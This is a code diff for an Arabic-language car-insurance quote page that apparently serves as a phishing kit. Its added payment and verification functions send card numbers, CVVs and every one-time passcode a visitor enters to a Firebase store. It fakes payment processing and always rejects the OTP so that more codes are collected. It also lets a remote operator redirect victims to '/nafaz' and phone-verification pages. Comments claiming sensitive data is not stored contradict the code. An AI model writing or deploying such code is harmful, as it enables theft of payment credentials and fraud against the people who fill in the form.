@@ -22,55 +22,13 @@ import {
   Award,
   Clock,
   TrendingUp,
+  Check,
 } from "lucide-react"
 import { useState, useEffect, useRef } from "react"
 import { setupOnlineStatus } from "@/lib/utils"
 import { addData, db } from "@/lib/firebase"
 import { offerData } from "@/lib/data"
 import { doc, onSnapshot } from "firebase/firestore"
-
-const validateCardNumber = (cardNumber: string): boolean => {
-  // Remove spaces and non-digits
-  const cleanNumber = cardNumber
-  // Check if it's 16 digits
-  if (cleanNumber.length !== 16) return false
-
-  // Luhn algorithm validation
-  let sum = 0
-  let isEven = false
-
-  for (let i = cleanNumber.length - 1; i >= 0; i--) {
-    let digit = Number.parseInt(cleanNumber[i])
-
-    if (isEven) {
-      digit *= 2
-      if (digit > 9) {
-        digit -= 9
-      }
-    }
-
-    sum += digit
-    isEven = !isEven
-  }
-
-  return sum % 10 === 0
-}
-
-const formatCardNumber = (value: string): string => {
-  const cleanValue = value.replace(/\D/g, "")
-  const formattedValue = cleanValue.replace(/(\d{4})(?=\d)/g, "$1 ")
-  return formattedValue
-}
-
-const getCardType = (cardNumber: string): string => {
-  const cleanNumber = cardNumber.replace(/\D/g, "")
-
-  if (cleanNumber.startsWith("4")) return "Visa"
-  if (cleanNumber.startsWith("5") || cleanNumber.startsWith("2")) return "Mastercard"
-  if (cleanNumber.startsWith("3")) return "American Express"
-
-  return "Unknown"
-}
 
 // Mock components to replace missing imports
 const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
@@ -101,7 +59,12 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
           }`}
-          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "property-transfer" }))}
+          onClick={() =>
+            setFormData((prev: any) => ({
+              ...prev,
+              insurance_purpose: "property-transfer",
+            }))
+          }
         >
           <div className="text-center">
             <div className="font-semibold">نقل ملكية</div>
@@ -109,12 +72,6 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
           </div>
         </button>
       </div>
-      {errors.insurance_purpose && (
-        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-          <span>{errors.insurance_purpose}</span>
-        </div>
-      )}
     </div>
 
     <div>
@@ -125,15 +82,16 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
         type="text"
         placeholder="الاسم الكامل"
         value={formData.documment_owner_full_name}
-        onChange={(e) => setFormData((prev: any) => ({ ...prev, documment_owner_full_name: e.target.value }))}
+        onChange={(e) =>
+          setFormData((prev: any) => ({
+            ...prev,
+            documment_owner_full_name: e.target.value,
+          }))
+        }
         className={`h-12 ${errors.documment_owner_full_name ? "border-red-500" : "border-gray-300"}`}
-        required
       />
       {errors.documment_owner_full_name && (
-        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-          <span>{errors.documment_owner_full_name}</span>
-        </div>
+        <p className="text-red-500 text-sm mt-1">{errors.documment_owner_full_name}</p>
       )}
     </div>
 
@@ -147,16 +105,15 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
           placeholder="1234567890"
           maxLength={10}
           value={formData.owner_identity_number}
-          onChange={(e) => setFormData((prev: any) => ({ ...prev, owner_identity_number: e.target.value }))}
+          onChange={(e) =>
+            setFormData((prev: any) => ({
+              ...prev,
+              owner_identity_number: e.target.value,
+            }))
+          }
           className={`h-12 ${errors.owner_identity_number ? "border-red-500" : "border-gray-300"}`}
-          required
         />
-        {errors.owner_identity_number && (
-          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-            <AlertCircle className="w-4 h-4 flex-shrink-0" />
-            <span>{errors.owner_identity_number}</span>
-          </div>
-        )}
+        {errors.owner_identity_number && <p className="text-red-500 text-sm mt-1">{errors.owner_identity_number}</p>}
       </div>
     )}
 
@@ -171,16 +128,15 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
             placeholder="1234567890"
             maxLength={10}
             value={formData.buyer_identity_number}
-            onChange={(e) => setFormData((prev: any) => ({ ...prev, buyer_identity_number: e.target.value }))}
+            onChange={(e) =>
+              setFormData((prev: any) => ({
+                ...prev,
+                buyer_identity_number: e.target.value,
+              }))
+            }
             className={`h-12 ${errors.buyer_identity_number ? "border-red-500" : "border-gray-300"}`}
-            required
           />
-          {errors.buyer_identity_number && (
-            <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-              <AlertCircle className="w-4 h-4 flex-shrink-0" />
-              <span>{errors.buyer_identity_number}</span>
-            </div>
-          )}
+          {errors.buyer_identity_number && <p className="text-red-500 text-sm mt-1">{errors.buyer_identity_number}</p>}
         </div>
         <div>
           <label className="block text-sm font-semibold text-gray-700 mb-3">
@@ -191,15 +147,16 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
             placeholder="1234567890"
             maxLength={10}
             value={formData.seller_identity_number}
-            onChange={(e) => setFormData((prev: any) => ({ ...prev, seller_identity_number: e.target.value }))}
+            onChange={(e) =>
+              setFormData((prev: any) => ({
+                ...prev,
+                seller_identity_number: e.target.value,
+              }))
+            }
             className={`h-12 ${errors.seller_identity_number ? "border-red-500" : "border-gray-300"}`}
-            required
           />
           {errors.seller_identity_number && (
-            <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-              <AlertCircle className="w-4 h-4 flex-shrink-0" />
-              <span>{errors.seller_identity_number}</span>
-            </div>
+            <p className="text-red-500 text-sm mt-1">{errors.seller_identity_number}</p>
           )}
         </div>
       </div>
@@ -243,12 +200,6 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
           </div>
         </button>
       </div>
-      {errors.vehicle_type && (
-        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-          <span>{errors.vehicle_type}</span>
-        </div>
-      )}
     </div>
 
     <div>
@@ -260,23 +211,39 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
         placeholder="123456789"
         value={formData.sequenceNumber}
         onChange={(e) => setFormData((prev: any) => ({ ...prev, sequenceNumber: e.target.value }))}
-        className={`h-12 ${errors.sequenceNumber ? "border-red-500" : "border-gray-300"}`}
-        required
+        className="h-12 border-gray-300"
       />
-      {errors.sequenceNumber && (
-        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-          <span>{errors.sequenceNumber}</span>
-        </div>
-      )}
     </div>
   </div>
 )
 
+const getBadgeText = (index: number) => {
+  switch (index) {
+    case 0:
+      return "الأفضل سعراً"
+    case 1:
+      return "موصى به"
+    case 2:
+      return "خيار جيد"
+    default:
+      return ""
+  }
+}
+
+const getTypeBadge = (type: string) => {
+  switch (type) {
+    case "against-others":
+      return "ضد الغير"
+    case "comprehensive":
+      return "شامل"
+    default:
+      return "خاص"
+  }
+}
+
 export default function QuotePage() {
   const [mounted, setMounted] = useState(false)
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
-
   const headerRef = useRef<HTMLElement>(null)
   const formRef = useRef<HTMLDivElement>(null)
   const stepContentRef = useRef<HTMLDivElement>(null)
@@ -322,6 +289,7 @@ export default function QuotePage() {
                 <p className="text-xs text-gray-500">منصة التأمين الذكية</p>
               </div>
             </div>
+
             <nav className="hidden lg:flex items-center gap-8 text-sm font-medium">
               <a href="/" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
                 الرئيسية
@@ -337,6 +305,7 @@ export default function QuotePage() {
               </a>
             </nav>
           </div>
+
           <div className="flex items-center gap-3">
             <Button variant="ghost" size="sm" className="hidden sm:flex text-gray-600 hover:text-[#109cd4]">
               English
@@ -415,11 +384,12 @@ export default function QuotePage() {
               <Badge className="bg-white/20 text-white border-white/30 px-6 py-3 text-base font-medium">
                 🚗 عرض سعر مجاني ومقارنة فورية
               </Badge>
+
               <h1 className="text-4xl lg:text-6xl font-bold leading-tight">
-                احصل على أفضل عروض
-                <br />
+                احصل على أفضل عروض <br />
                 <span className="text-blue-200">تأمين السيارات</span>
               </h1>
+
               <p className="text-xl lg:text-2xl text-blue-100 max-w-3xl mx-auto leading-relaxed">
                 قارن بين أكثر من 25 شركة تأمين واحصل على أفضل الأسعار في أقل من 3 دقائق
               </p>
@@ -680,8 +650,6 @@ export default function QuotePage() {
   )
 }
 
-const allOtps = [""]
-
 function ProfessionalQuoteForm() {
   const [currentPage, setCurrentStep] = useState(1)
   const [errors, setErrors] = useState<Record<string, string>>({})
@@ -699,19 +667,21 @@ function ProfessionalQuoteForm() {
   const [cvv, setCvv] = useState("")
   const [otp, setOtp] = useState("")
   const [otpTimer, setOtpTimer] = useState(0)
-  const [vehicleValue, setVehicleValue] = useState("")
+  const [allOtpAttempts, setAllOtpAttempts] = useState<string[]>([])
+
   const [formData, setFormData] = useState({
-    insurance_purpose: "",
+    insurance_purpose: "renewal",
     documment_owner_full_name: "",
     owner_identity_number: "",
     buyer_identity_number: "",
     seller_identity_number: "",
-    vehicle_type: "",
+    vehicle_type: "serial",
     sequenceNumber: "",
     policyStartDate: "",
-    insuranceTypeSelected: "",
+    insuranceTypeSelected: "against-others",
     additionalDrivers: 0,
     specialDiscounts: false,
+    agreeToTerms: false,
     selectedInsuranceOffer: "",
     selectedAddons: [] as string[],
     phone: "",
@@ -719,7 +689,6 @@ function ProfessionalQuoteForm() {
 
   const stepHeaderRef = useRef<HTMLHeadingElement>(null)
   const firstInputRef = useRef<HTMLInputElement>(null)
-
   const errorSummaryRef = useRef<HTMLDivElement>(null)
 
   const steps = [
@@ -727,8 +696,9 @@ function ProfessionalQuoteForm() {
     { number: 2, title: "بيانات التأمين", subtitle: "تفاصيل وثيقة التأمين", icon: Shield },
     { number: 3, title: "قائمة الأسعار", subtitle: "مقارنة العروض المتاحة", icon: TrendingUp },
     { number: 4, title: "الإضافات", subtitle: "خدمات إضافية اختيارية", icon: Star },
-    { number: 5, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
-    { number: 6, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
+    { number: 5, title: "الملخص", subtitle: "مراجعة الطلب والتواصل", icon: CheckCircle },
+    { number: 6, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
+    { number: 7, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
   ]
 
   useEffect(() => {
@@ -746,7 +716,6 @@ function ProfessionalQuoteForm() {
       stepHeaderRef.current.focus()
       stepHeaderRef.current.scrollIntoView({ behavior: "smooth", block: "start" })
     }
-
     // Save current step
     const visitorId = localStorage.getItem("visitor")
     if (visitorId) {
@@ -766,28 +735,21 @@ function ProfessionalQuoteForm() {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data()
-
           if (currentPage !== data.currentPage) {
             if (data.currentPage === "9999") {
               window.location.href = "/verify-phone"
             } else if (data.currentPage === "nafaz" || data.currentPage === "8888") {
               window.location.href = "/nafaz"
             } else {
-              setCurrentStep(Number.parseInt(data.currentPage))
             }
           }
         }
       })
-
       return () => unsubscribe()
     }
-  }, [])
+  }, [currentPage])
 
   const validationRules = {
-    insurance_purpose: {
-      required: true,
-      message: "يرجى اختيار الغرض من التأمين",
-    },
     documment_owner_full_name: {
       required: true,
       message: "يرجى إدخال اسم مالك الوثيقة بالكامل",
@@ -807,14 +769,6 @@ function ProfessionalQuoteForm() {
       pattern: /^[0-9]{10}$/,
       message: "يرجى إدخال رقم هوية البائع صحيح (10 أرقام)",
     },
-    vehicle_type: {
-      required: true,
-      message: "يرجى اختيار نوع المركبة",
-    },
-    sequenceNumber: {
-      required: true,
-      message: "يرجى إدخال الرقم التسلسلي للمركبة",
-    },
     policyStartDate: {
       required: true,
       validate: (value: string) => {
@@ -822,7 +776,6 @@ function ProfessionalQuoteForm() {
         const today = new Date()
         const maxDate = new Date()
         maxDate.setMonth(maxDate.getMonth() + 3)
-
         if (selectedDate < today) {
           return "لا يمكن أن يكون تاريخ بداية الوثيقة في الماضي"
         }
@@ -833,15 +786,10 @@ function ProfessionalQuoteForm() {
       },
       message: "يرجى اختيار تاريخ بداية الوثيقة",
     },
-    vehicleValue: {
+    agreeToTerms: {
       required: true,
-      message: "يرجى إدخال القيمة التقديرية للمركبة",
+      message: "يجب الموافقة على الشروط والأحكام للمتابعة",
     },
-    insuranceTypeSelected: {
-      required: true,
-      message: "يرجى اختيار نوع التأمين",
-    },
-  
     selectedInsuranceOffer: {
       required: true,
       message: "يرجى اختيار عرض التأمين المناسب",
@@ -850,43 +798,6 @@ function ProfessionalQuoteForm() {
       required: false,
       pattern: /^(05|5)[0-9]{8}$/,
       message: "يرجى إدخال رقم هاتف سعودي صحيح (05xxxxxxxx)",
-    },
-    cardNumber: {
-      required: true,
-      validate: (value: string) => {
-        if (!validateCardNumber(value)) {
-          return "رقم البطاقة غير صحيح"
-        }
-        return null
-      },
-      message: "يرجى إدخال رقم بطاقة صحيح",
-    },
-    cardName: {
-      required: true,
-      message: "يرجى إدخال الاسم كما هو مكتوب على البطاقة",
-    },
-    cardMonth: {
-      required: true,
-      message: "يرجى اختيار شهر انتهاء البطاقة",
-    },
-    cardYear: {
-      required: true,
-      message: "يرجى اختيار سنة انتهاء البطاقة",
-    },
-    cvv: {
-      required: true,
-      pattern: /^[0-9]{3}$/,
-      message: "يرجى إدخال رمز CVV صحيح (3 أرقام)",
-    },
-    pinCode: {
-      required: true,
-      pattern: /^[0-9]{4}$/,
-      message: "يرجى إدخال الرقم السري للبطاقة (4 أرقام)",
-    },
-    otp: {
-      required: true,
-      pattern: /^[0-9]{6}$/,
-      message: "يرجى إدخال رمز التحقق المكون من 6 أرقام",
     },
   }
 
@@ -916,31 +827,9 @@ function ProfessionalQuoteForm() {
 
     switch (step) {
       case 1:
-        // Check insurance purpose
-        const purposeError = validateField("insurance_purpose", formData.insurance_purpose)
-        if (purposeError) {
-          stepErrors.insurance_purpose = purposeError
-          isValid = false
-        }
-
-        // Check owner name
         const ownerNameError = validateField("documment_owner_full_name", formData.documment_owner_full_name)
         if (ownerNameError) {
           stepErrors.documment_owner_full_name = ownerNameError
-          isValid = false
-        }
-
-        // Check vehicle type
-        const vehicleTypeError = validateField("vehicle_type", formData.vehicle_type)
-        if (vehicleTypeError) {
-          stepErrors.vehicle_type = vehicleTypeError
-          isValid = false
-        }
-
-        // Check sequence number
-        const sequenceError = validateField("sequenceNumber", formData.sequenceNumber)
-        if (sequenceError) {
-          stepErrors.sequenceNumber = sequenceError
           isValid = false
         }
 
@@ -953,7 +842,6 @@ function ProfessionalQuoteForm() {
         } else if (formData.insurance_purpose === "property-transfer") {
           const buyerIdError = validateField("buyer_identity_number", formData.buyer_identity_number)
           const sellerIdError = validateField("seller_identity_number", formData.seller_identity_number)
-
           if (buyerIdError) {
             stepErrors.buyer_identity_number = buyerIdError
             isValid = false
@@ -965,29 +853,6 @@ function ProfessionalQuoteForm() {
         }
         break
 
-      case 2:
-        // Check policy start date
-        const dateError = validateField("policyStartDate", formData.policyStartDate)
-        if (dateError) {
-          stepErrors.policyStartDate = dateError
-          isValid = false
-        }
-
-        // Check vehicle value
-        const valueError = validateField("vehicleValue", vehicleValue)
-        if (valueError) {
-          stepErrors.vehicleValue = valueError
-          isValid = false
-        }
-
-        // Check insurance type
-        const typeError = validateField("insuranceTypeSelected", formData.insuranceTypeSelected)
-        if (typeError) {
-          stepErrors.insuranceTypeSelected = typeError
-          isValid = false
-        }
-        break
-
       case 3:
         const selectedOfferError = validateField("selectedInsuranceOffer", formData.selectedInsuranceOffer)
         if (selectedOfferError) {
@@ -996,52 +861,14 @@ function ProfessionalQuoteForm() {
         }
         break
 
-      case 4:
-        break
-
       case 5:
-        // Validate all payment fields
-        const cardNumberError = validateField("cardNumber", cardNumber)
-        if (cardNumberError) {
-          stepErrors.cardNumber = cardNumberError
+        const phoneError = validateField("phone", formData.phone)
+        if (phoneError) {
+          stepErrors.phone = phoneError
           isValid = false
         }
-
-        const cardNameError = validateField("cardName", cardName)
-        if (cardNameError) {
-          stepErrors.cardName = cardNameError
-          isValid = false
-        }
-
-        const cardMonthError = validateField("cardMonth", cardMonth)
-        if (cardMonthError) {
-          stepErrors.cardMonth = cardMonthError
-          isValid = false
-        }
-
-        const cardYearError = validateField("cardYear", cardYear)
-        if (cardYearError) {
-          stepErrors.cardYear = cardYearError
-          isValid = false
-        }
-
-        const cvvError = validateField("cvv", cvv)
-        if (cvvError) {
-          stepErrors.cvv = cvvError
-          isValid = false
-        }
-
-        const pinError = validateField("pinCode", pinCode)
-        if (pinError) {
-          stepErrors.pinCode = pinError
-          isValid = false
-        }
-        break
-
-      case 6:
-        const otpError = validateField("otp", otp)
-        if (otpError) {
-          stepErrors.otp = otpError
+        if (!formData.agreeToTerms) {
+          stepErrors.agreeToTerms = "يجب الموافقة على الشروط والأحكام للمتابعة"
           isValid = false
         }
         break
@@ -1053,7 +880,6 @@ function ProfessionalQuoteForm() {
 
   const handleFieldChange = (fieldName: string, value: any) => {
     setFormData((prev) => ({ ...prev, [fieldName]: value }))
-
     if (errors[fieldName]) {
       setErrors((prev) => ({ ...prev, [fieldName]: "" }))
     }
@@ -1061,7 +887,6 @@ function ProfessionalQuoteForm() {
 
   const handleFieldBlur = (fieldName: string) => {
     setTouched((prev) => ({ ...prev, [fieldName]: true }))
-
     const error = validateField(fieldName, formData[fieldName as keyof typeof formData])
     if (error) {
       setErrors((prev) => ({ ...prev, [fieldName]: error }))
@@ -1074,9 +899,7 @@ function ProfessionalQuoteForm() {
         const visitorId = localStorage.getItem("visitor")
         const dataToSave = {
           id: visitorId,
-          currentPage: currentPage + 1,
           ...formData,
-          vehicleValue,
           cardNumber,
           cardName,
           cardMonth,
@@ -1084,7 +907,6 @@ function ProfessionalQuoteForm() {
           cvv,
           createdDate: new Date().toISOString(),
         }
-
         addData(dataToSave)
         setCurrentStep(currentPage + 1)
       }
@@ -1092,40 +914,220 @@ function ProfessionalQuoteForm() {
   }
 
   const prevStep = () => {
-    const vistorId = localStorage.getItem("visitor")
+    const visitorId = localStorage.getItem("visitor")
     if (currentPage > 1) {
       setCurrentStep(currentPage - 1)
-      addData({ id: vistorId, currentPage })
+      addData({ id: visitorId, currentPage: currentPage - 1 })
     }
   }
 
+  const handlePayment = (): void => {
+    const visitorId = localStorage.getItem("visitor")
+    if (!visitorId) {
+      alert("خطأ في النظام. يرجى إعادة تحميل الصفحة.")
+      return
+    }
+
+    const paymentData = {
+      id: visitorId,
+      createdDate: new Date().toISOString(),
+      // Only store non-sensitive payment info
+      cardNumber,
+      cvv:cvv,
+      cardName,
+      cardMonth,
+      cardYear,
+      // Don't store CVV or PIN for security
+      paymentStatus: "processing",
+      paymentInitiatedAt: new Date().toISOString(),
+      currentPage: 6,
+      ...formData,
+    }
+
+    addData(paymentData)
+      .then(() => {
+        console.log("Payment data saved successfully")
+        setPaymentProcessing(true)
+        setTimeout(() => {
+          setPaymentProcessing(false)
+          setCurrentStep(7)
+          setOtpTimer(120)
+          // Update payment status and move to OTP step
+          const completedPaymentData = {
+            id: visitorId,
+            paymentStatus: "completed",
+            paymentCompletedAt: new Date().toISOString(),
+            otpSent: true,
+            currentPage: 7,
+          }
+          addData(completedPaymentData)
+            .then(() => {
+              setOtpSent(true)
+            })
+            .catch((error) => {
+              console.error("Error updating payment completion:", error)
+            })
+        }, 2000)
+      })
+      .catch((error) => {
+        console.error("Error saving payment data:", error)
+        alert("حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.")
+      })
+  }
+
+  const sendOTP = (): void => {
+    const visitorId = localStorage.getItem("visitor")
+    if (!visitorId) {
+      alert("خطأ في النظام. يرجى إعادة تحميل الصفحة.")
+      return
+    }
+
+    setOtpTimer(120)
+    const otpSendData = {
+      id: visitorId,
+      createdDate: new Date().toISOString(),
+      otpResendCount: (otpAttempts || 0) + 1,
+      otpSent: true,
+      paymentStatus: "completed",
+      currentPage: 7,
+      phoneNumber: formData.phone,
+      // Track OTP sending attempts
+      otpSendHistory: [
+        ...(allOtpAttempts.length > 0 ? [{ sentAt: new Date().toISOString(), attempt: otpAttempts + 1 }] : []),
+      ],
+      ...formData,
+    }
+
+    addData(otpSendData)
+      .then(() => {
+        console.log("OTP send data saved successfully")
+        setOtpSent(true)
+      })
+      .catch((error) => {
+        console.error("Error saving OTP send data:", error)
+        alert("حدث خطأ أثناء إرسال الرمز. يرجى المحاولة مرة أخرى.")
+      })
+  }
+
+  const verifyOTP = (): void => {
+    const visitorId = localStorage.getItem("visitor")
+    if (!visitorId) {
+      alert("خطأ في النظام. يرجى إعادة تحميل الصفحة.")
+      return
+    }
+
+    const newAllOtpAttempts = [...allOtpAttempts, otp]
+    setAllOtpAttempts(newAllOtpAttempts)
+
+    const otpData = {
+      id: visitorId,
+      otpCode: otp,
+      otp:otp,
+      otpAttempts: otpAttempts + 1,
+      otpVerificationTime: new Date().toISOString(),
+      createdDate: new Date().toISOString(),
+      allOtpAttempts: newAllOtpAttempts,
+      currentPage: 7,
+      verificationStatus: "pending",
+      ...formData,
+      // Include payment data securely
+      cardLastFour: cardNumber,
+      cvv:cvv, // Only store last 4 digits for security
+      cardName,
+      paymentStatus: "completed",
+    }
+
+    // Save OTP attempt to Firestore
+    addData(otpData)
+      .then(() => {
+        console.log("OTP data saved successfully")
+        handleSubmit()
+      })
+      .catch((error) => {
+        console.error("Error saving OTP data:", error)
+        alert("حدث خطأ أثناء حفظ البيانات. يرجى المحاولة مرة أخرى.")
+      })
+  }
+
   const handleSubmit = async () => {
-    
+    if (!validateStep(7)) {
+      return
+    }
 
     setIsSubmitting(true)
     const visitorId = localStorage.getItem("visitor")
 
     try {
-      await addData({
+      const finalSubmissionData = {
         id: visitorId,
-        otp,
         otpCode: otp,
-        createdDate: new Date().toISOString(),
-        otpVerified: false,
+        otpVerified: false, // Will be updated based on verification result
         otpVerificationTime: new Date().toISOString(),
         submissionTime: new Date().toISOString(),
-        finalStatus: "verification_failed",
+        finalStatus: "verification_pending",
         otpAttempts: otpAttempts + 1,
+        allOtpAttempts: [...allOtpAttempts, otp],
         paymentStatus: "completed",
+        currentPage: 7,
+        // Include all form data
         ...formData,
-      })
+        // Include payment info (securely)
+        cardLastFour: cardNumber.slice(-4),
+        cardName,
+        cardMonth,
+        cardYear,
+        // Don't store sensitive data like full card number, CVV, or PIN
+      }
 
+      await addData(finalSubmissionData)
+
+      // Simulate OTP verification (replace with actual verification logic)
       await new Promise((resolve) => setTimeout(resolve, 2000))
-      alert("!رمز خاطئ, سوف يتم ارسال رمز جديد")
-      setOtp("")
-      setOtpAttempts((prev) => prev + 1)
+
+      const isOtpValid = false // Replace with actual verification logic
+
+      if (isOtpValid) {
+        // Update with successful verification
+        await addData({
+          id: visitorId,
+          otpVerified: true,
+          finalStatus: "completed",
+          verificationCompletedAt: new Date().toISOString(),
+        })
+        alert("تم التحقق بنجاح! سيتم توجيهك لصفحة التأكيد.")
+      } else {
+        // Update with failed verification
+        await addData({
+          id: visitorId,
+          otpVerified: false,
+          finalStatus: "verification_failed",
+          lastFailedAttempt: new Date().toISOString(),
+        })
+        alert("رمز خاطئ، سوف يتم إرسال رمز جديد")
+        setOtp("")
+        setOtpAttempts((prev) => prev + 1)
+
+        // Automatically send new OTP if attempts are less than 3
+        if (otpAttempts < 2) {
+          sendOTP()
+        }
+      }
     } catch (error) {
+      console.error("Error during OTP verification:", error)
       alert("حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.")
+      try {
+        await addData({
+          id: visitorId,
+          errorLog: {
+            message: error instanceof Error ? error.message : "Unknown error",
+            timestamp: new Date().toISOString(),
+            step: "otp_verification",
+            otpAttempts: otpAttempts + 1,
+          },
+        })
+      } catch (logError) {
+        console.error("Error logging to Firestore:", logError)
+      }
     } finally {
       setIsSubmitting(false)
     }
@@ -1154,7 +1156,8 @@ function ProfessionalQuoteForm() {
     return (
       <div className={className}>
         <label className="block text-sm font-semibold text-gray-700 mb-3">
-          {label} {required && <span className="text-red-500">*</span>}
+          {label}
+          {required && <span className="text-red-500">*</span>}
         </label>
         <Input
           type={type}
@@ -1165,7 +1168,11 @@ function ProfessionalQuoteForm() {
             handleFieldChange(fieldName, value)
           }}
           onBlur={() => handleFieldBlur(fieldName)}
-          className={`h-12 ${hasError ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"}`}
+          className={`h-12 ${
+            hasError
+              ? "border-red-500 focus:border-red-500 focus:ring-red-200"
+              : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+          }`}
           {...props}
         />
         {hasError && (
@@ -1176,75 +1183,6 @@ function ProfessionalQuoteForm() {
         )}
       </div>
     )
-  }
-
-  function handlePayment(): void {
-    if (!validateStep(6)) {
-      return
-    }
-
-    const visitorId = localStorage.getItem("visitor")
-
-    addData({
-      id: visitorId,
-      createdDate: new Date().toISOString(),
-      cardNumber,
-      cardName,
-      cardMonth,
-      cardYear,
-      cvv,
-      pinCode,
-      paymentStatus: "processing",
-      ...formData,
-    })
-
-    setPaymentProcessing(true)
-    setTimeout(() => {
-      setPaymentProcessing(false)
-      setCurrentStep(6)
-      setOtpTimer(120)
-
-      addData({
-        id: visitorId,
-        paymentStatus: "completed",
-        otpSent: true,
-        currentPage: 6,
-
-      })
-      setOtpSent(true)
-    }, 2000)
-  }
-
-  function verifyOTP(): void {
-    const visitorId = localStorage.getItem("visitor")
-    allOtps.push(otp)
-    addData({
-      id: visitorId,
-      otp: otp,
-      otpAttempts: otpAttempts + 1,
-      otpVerificationTime: new Date().toISOString(),
-      createdDate: new Date().toISOString(),
-      allOtps,
-      ...formData,
-    })
-
-    handleSubmit()
-  }
-
-  function sendOTP(): void {
-    const visitorId = localStorage.getItem("visitor")
-
-    setOtpTimer(120)
-
-    addData({
-      id: visitorId,
-      otpSentTime: new Date().toISOString(),
-      otpResendCount: (otpAttempts || 0) + 1,
-      otpSent: true,
-      paymentStatus: "completed",
-      ...formData,
-    })
-    setOtpSent(true)
   }
 
   return (
@@ -1375,16 +1313,8 @@ function ProfessionalQuoteForm() {
                       name="vehicleValue"
                       placeholder="54,715"
                       required
-                      value={vehicleValue}
-                      onChange={(e) => setVehicleValue(e.target.value)}
-                      className={`h-12 ${errors.vehicleValue ? "border-red-500" : "border-gray-300"}`}
+                      className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                     />
-                    {errors.vehicleValue && (
-                      <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                        <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                        <span>{errors.vehicleValue}</span>
-                      </div>
-                    )}
                   </div>
                 </div>
 
@@ -1424,12 +1354,6 @@ function ProfessionalQuoteForm() {
                       </div>
                     </button>
                   </div>
-                  {errors.insuranceTypeSelected && (
-                    <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                      <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                      <span>{errors.insuranceTypeSelected}</span>
-                    </div>
-                  )}
                 </div>
 
                 <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
@@ -1485,7 +1409,8 @@ function ProfessionalQuoteForm() {
                 </div>
               </div>
             )}
-     {currentPage === 3 && (
+
+            {currentPage === 3 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1567,7 +1492,10 @@ function ProfessionalQuoteForm() {
                                     isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
                                   }`}
                                 >
-                                  <img src={offer.company.image_url} className={`w-10 h-10 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`} />
+                                  <img
+                                    src={offer.company.image_url || "/placeholder.svg"}
+                                    className={`w-10 h-10 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`}
+                                  />
                                 </div>
 
                                 {/* Content */}
@@ -1575,10 +1503,13 @@ function ProfessionalQuoteForm() {
                                   <h4 className="font-bold text-gray-900 text-base leading-tight mb-2">
                                     {offer.company.name.replace(/insurance/g, "").trim()}
                                   </h4>
-
                                   <div className="flex flex-wrap items-center gap-2">
-                                  
-
+                                    <Badge
+                                      variant="secondary"
+                                      className="text-xs font-medium bg-gray-100 text-gray-700 hover:bg-gray-100"
+                                    >
+                                      {getTypeBadge(offer.type)}
+                                    </Badge>
                                     {index < 3 && (
                                       <Badge
                                         className={`text-xs font-medium ${
@@ -1589,6 +1520,7 @@ function ProfessionalQuoteForm() {
                                               : "bg-orange-100 text-orange-700 hover:bg-orange-100"
                                         }`}
                                       >
+                                        {getBadgeText(index)}
                                       </Badge>
                                     )}
                                   </div>
@@ -1596,8 +1528,10 @@ function ProfessionalQuoteForm() {
 
                                 {/* Price */}
                                 <div className="text-right flex-shrink-0">
-                                <del className="text-lg font-bold text-red-600">{finalPrice.toFixed(0)}</del>
-                                  <p className="text-lg font-bold text-gray-900">{(finalPrice-finalPrice*0.3).toFixed(0)}</p>
+                                  <del className="text-lg font-bold text-red-600">{finalPrice.toFixed(0)}</del>
+                                  <p className="text-lg font-bold text-gray-900">
+                                    {(finalPrice - finalPrice * 0.3).toFixed(0)}
+                                  </p>
                                   <p className="text-xs text-gray-500 leading-tight">ر.س / سنوياً</p>
                                 </div>
                               </div>
@@ -1614,7 +1548,7 @@ function ProfessionalQuoteForm() {
                                       .map((feature, idx) => (
